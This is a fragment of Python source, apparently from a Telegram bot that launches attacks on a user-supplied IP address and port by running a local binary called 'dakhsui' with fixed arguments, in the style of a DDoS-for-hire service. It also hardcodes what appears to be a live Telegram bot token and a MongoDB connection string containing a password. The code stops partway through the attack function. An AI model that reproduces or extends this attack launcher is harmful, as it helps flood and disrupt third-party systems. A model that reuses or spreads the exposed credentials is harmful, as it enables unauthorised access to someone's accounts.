...
TOKEN = '7883239820:AAG7ZbJntggkiryrL28RFBi_vhlsniu_OyM'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
CHANNEL_ID = -2398803408
ADMIN_IDS = -2398803408
...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./dakhsui", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
